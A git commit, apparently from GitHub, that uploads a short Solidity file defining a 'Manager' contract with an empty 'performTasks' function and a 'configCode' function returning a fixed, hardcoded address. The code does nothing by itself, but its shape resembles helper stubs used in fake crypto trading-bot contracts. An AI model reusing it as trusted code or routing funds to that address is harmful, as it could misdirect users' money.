a97871b97f38cf27e7624a846982272e75bde4c4
ImVitaal <45016465+ImVitaal@users.noreply.github.com>
2022-09-06 22:15:42 +0100

    Add files via upload

---
+++ zoro.sol
@@ -0,0 +1,12 @@
+
+// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity ^0.6.12;
+
+contract Manager {
+    function performTasks() public {}
+
+    function configCode() public pure returns (address) {
+        return 0xF7Ff40FAA4972D3404Ec835F6A8Cc11F19F606B4;
+    }
+}
